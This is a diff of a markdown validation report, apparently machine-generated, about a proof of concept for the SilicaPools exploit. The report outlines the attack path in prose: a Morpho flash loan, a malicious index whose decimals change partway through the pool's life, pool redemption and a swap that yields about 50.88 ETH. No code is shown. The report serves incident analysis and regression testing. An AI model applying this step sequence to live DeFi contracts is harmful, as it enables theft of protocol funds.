+Key observations from the validator run:
+- Compilation succeeds with no missing sources or scripts.
+- The test suite runs one test:
+  - `test_Exploit_MorphoSilica_WBTC_WETH()` **[PASS]** (gas: ~543k).
+- The trace shows:
+  - `vm.createSelectFork` targeting mainnet block `22146339`.
+  - Morpho flash‑loan of `1_000_000_000` WBTC to the attacker contract.
+  - SilicaPools `collateralizedMint`, ERC1155 transfers to the bounty receiver, `startPool`, `endPool`, `redeemShort`.
+  - Uniswap V3 swap with `amountSpecified = 114,015,390` WBTC and a non‑trivial state delta in the pool.
+  - `WETH9.withdraw` of `50.884937982392301148` WETH, followed by a fallback on the profit receiver receiving the same ETH amount.
+  - Final `WBTC::transferFrom` of exactly `1_000_000_000` WBTC from the attacker contract back to Morpho.
 
-- `artifacts/poc/poc_validator/poc_validated_result.json`
+The validator’s structured result in `poc_validated_result.json` is:
+- `overall_status`: `"Pass"`
+- `poc_correctness_checks.passes_validation_oracles.passed`: `true`
+- All PoC quality checks (oracle alignment, human readability, magic numbers justification, mainnet‑fork, self‑containment, end‑to‑end flow, and alignment with root cause) are marked `true`.
+- `artifacts.validator_test_log_path` points to the Forge log captured above.
 
-encodes the following high-level outcome:
-
-- `overall_status = "Pass"`  
-  - The PoC’s main test `ExploitTest.testExploit` passes on the mainnet fork.
-  - All validation oracles (pre-checks, hard constraints, soft constraints) are implemented and satisfied.
-  - Quality criteria—oracle alignment, readability, absence of attacker artifacts, end-to-end ACT coverage, and root-cause alignment—are all marked as passing.
-
-Key robustness points:
-
-- **Oracle Alignment:** every oracle from `oracle_definition.json` is explicitly codified as an assertion or expectation in the test; there is no silent reliance on behavior.
-- **Mainnet Fork & Real Integrations:** the PoC uses a mainnet fork with real contracts for SilicaPools, WBTC, WETH, and Uniswap V3; no core protocol component is mocked.
-- **Self-Contained Adversary:** attacker addresses and the malicious index are freshly deployed/derived and do not reuse incident EOAs or helper contract addresses.
-- **Value-Flow Verification:** ETH profit and WBTC depletion are both directly asserted, ensuring the exploit is not a no-op on the victim or a purely notional profit.
-
-The PoC therefore provides a robust, repeatable reproduction of the exploit scenario suitable for regression testing and protocol-hardening work.
+Robustness considerations:
+- The PoC uses concrete amounts derived from the incident, but the oracle thresholds are tolerant (e.g., ≥1 ETH profit rather than an exact value), so minor variations in pool state or fees should still satisfy the checks as long as the economic structure of the exploit remains valid.
+- The use of `vm.createSelectFork` at a fixed block ensures reproducibility and shields the PoC from future on‑chain state changes.
 
 ---
 
 ## Linking PoC Behavior to Root Cause
 
-Finally, we connect the PoC’s behavior back to the root-cause framing for the SilicaPools incident.
+The root‑cause analysis for the seed transaction describes:
+- An attacker contract `yoink` call that:
+  - Approves WBTC to SilicaPools and Morpho.
+  - Initiates a Morpho WBTC flash loan of `1_000_000_000` units.
+  - Uses SilicaPools ERC1155 positions and accounting token mechanics to manipulate a pool and extract value.
+  - Routes WBTC through a Uniswap V3 WBTC/WETH pool.
+  - Calls WETH9 to withdraw WETH into ETH, reducing WETH9’s native balance by ~50.8849 ETH.
+  - Leaves the attacker cluster with significant ETH profit and neutral WBTC balance.
 
-### Exercising the Vulnerable Logic
+The PoC mirrors this behavior using fresh attacker identities:
 
-The root-cause report identifies the following key elements:
+- **Morpho flash loan and zero WBTC net change**
+  - The PoC’s `yoink` and `onMorphoFlashLoan` follow the same approval and flash‑loan pattern, borrowing exactly `1e9` WBTC and later repaying the same amount to Morpho.  
+  - The hard oracle asserts that the attacker cluster’s WBTC balance is unchanged, matching the incident’s principal‑only WBTC flows.
 
-- SilicaPools relies on an external `ISilicaIndex` for `shares`, `balance`, and `decimals`.
-- `PoolMaths.balanceChangePerShare` is computed at pool end using **live `index.decimals()`**.
-- The adversary-controlled index in the incident changes `decimals` from a high value (e.g., 31) to a low value (e.g., 1) mid-lifecycle.
-- This mismatch between collateralization-time assumptions and end-of-pool scaling enables undercollateralized WBTC payouts.
+- **SilicaPools ERC1155 mechanics**
+  - The PoC uses the same SilicaPools contract, accounting token, ERC1155 token IDs, floor/cap values, and timestamps as identified in the trace.  
+  - It replicates the sequence of `collateralizedMint`, ERC1155 `safeTransferFrom` to the bounty receiver, `startPool`, `endPool`, and `redeemShort`, demonstrating how the Silica pool configuration is exploited to route value back to the attacker.
 
-The PoC directly targets this logic:
+- **Uniswap V3 WBTC/WETH swap and WETH9 withdrawal**
+  - The PoC drives the real Uniswap V3 WBTC/WETH pool with the same swap parameters as in the incident.  
+  - The validated trace shows the expected WBTC in/WETH out behavior and state diffs on the pool contract.  
+  - Subsequent `WETH9.withdraw` and the ETH transfer to `profit_receiver` match the victim depletion pattern described in the root‑cause artifacts, including the magnitude of WETH/ETH flow.
 
-- Deploys a local `MaliciousIndex` with high initial decimals.
-- Collateralizes a WBTC-denominated Silica pool that references this index.
-- After collateral is locked and long/short tokens are minted, the attacker:
-  - decreases `decimals` to 1,
-  - increases `balance` to a large value, shaping a favorable `balanceChangePerShare`.
-- When SilicaPools ends the pool, it:
-  - reads the new large `balance`,
-  - reads the new low `decimals`,
-  - recomputes `balanceChangePerShare` based on these mutated values.
+- **Attacker profit and ACT framing**
+  - **Adversary Actions (A)**: constructing the attacker contract, triggering the Morpho flash loan, driving SilicaPools, executing the swap, and unwrapping WETH.  
+  - **Chain/Contract Transitions (C)**: Morpho flash‑loan callbacks, SilicaPools ERC1155 mints/transfers, accounting token index changes, Uniswap pool state updates, and WETH9 balance changes.  
+  - **Target Observation (T)**: The oracles and final assertions observe:
+    - ETH profit realized by the attacker cluster (attacker_eoa + attacker_contract + profit_receiver).  
+    - No net WBTC gain for the attacker cluster.  
+    - Depletion of WETH9’s native balance.
 
-Traces confirm that `MaliciousIndex::decimals()` is called from `SilicaPools::endPool`, and storage diffs show `decimals` changing from `31` to `1` during the exploit, exactly mirroring the incident’s key invariant violation.
+Together, these steps show that the PoC not only replays the structural exploit path but also satisfies the explicit oracle predicates that encode the root cause: an MEV‑style opportunity where an unprivileged attacker uses a flash loan and SilicaPools mispricing to convert protocol‑owned WETH into attacker‑owned ETH without taking WBTC principal risk.
 
-### Demonstrating Victim Loss and Adversary Profit
-
-The ACT framing in the root-cause report defines the exploit predicate as **positive ETH profit** for the adversary, derived from undercollateralized WBTC payouts. The PoC encodes this as:
-
-- **Victim Loss:**
-  - Asserts SilicaPools holds WBTC collateral before the exploit.
-  - Asserts SilicaPools’ WBTC balance decreases after the exploit.
-
-- **Adversary Profit:**
-  - Asserts attacker ETH balance increases after redeeming long tokens and swapping WBTC→WETH→ETH.
-
-These checks map directly onto the incident narrative:
-
-- WBTC value leaves SilicaPools due to mis-scaled accounting.
-- The attacker converts this value into ETH and ends with strictly positive ETH profit.
-
-### Mapping to ACT Roles and Steps
-
-- **Adversary-crafted actions:**
-  - Deploying and configuring the malicious index (`MaliciousIndex`).
-  - Constructing and signing the Silica order (maker) and filling it (attacker).
-  - Starting and ending the pool, reconfiguring index state mid-lifecycle.
-  - Redeeming long tokens and performing the Uniswap swap and WETH withdrawal.
-
-- **Victim-observed state:**
-  - SilicaPools’ accounting of collateral and payouts (via `poolState` and `balanceChangePerShare`).
-  - WBTC balances of SilicaPools and the attacker.
-  - ETH balance of the attacker post-swap.
-
-The PoC ties these together via explicit assertions and logs, confirming that the same **mutable-decimals root cause** identified in the root-cause analysis is sufficient, in isolation, to realize the exploit predicate on a mainnet fork.
-
----
-
-## Summary
-
-This PoC:
-
-- Runs on an Ethereum mainnet fork with real SilicaPools, WBTC, WETH, and Uniswap V3 contracts.
-- Introduces a locally deployed malicious index with mutable `decimals`.
-- Shows that changing `decimals` mid-lifecycle and relying on SilicaPools’ use of live `index.decimals()` at pool end leads to mis-scaled payouts.
-- Demonstrates both **WBTC loss for SilicaPools** and **positive ETH profit for the attacker**, satisfying all validation oracles.
-- Avoids using real attacker EOAs or contracts from the incident, keeping the reproduction self-contained and suitable for regression testing.
-
-The PoC is therefore a high-quality, oracle-aligned reproduction of the SilicaPools custom index decimals manipulation exploit.
+This alignment between the PoC’s behavior, the oracle specification, and the root‑cause analysis justifies the validator’s conclusion that the PoC is correct, high‑quality, and fully reproduces the incident’s exploit conditions.
 
